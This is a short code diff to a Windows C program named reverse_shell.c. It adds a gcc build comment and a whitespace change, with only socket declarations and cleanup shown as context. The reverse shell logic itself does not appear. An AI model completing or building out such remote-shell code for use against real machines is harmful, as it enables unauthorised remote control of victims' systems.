@@ -3,6 +3,7 @@
 #include <windows.h>
 #pragma comment(lib, "Ws2_32.lib")
 
+// gcc reverse_shell.c -o reverse_shell -lws2_32
 int main() {
     SOCKET shell;
     struct sockaddr_in shell_addr;
@@ -53,5 +54,5 @@ int main() {
         WSACleanup();
     }
 
-    return 0;
+    return 0; 
 }
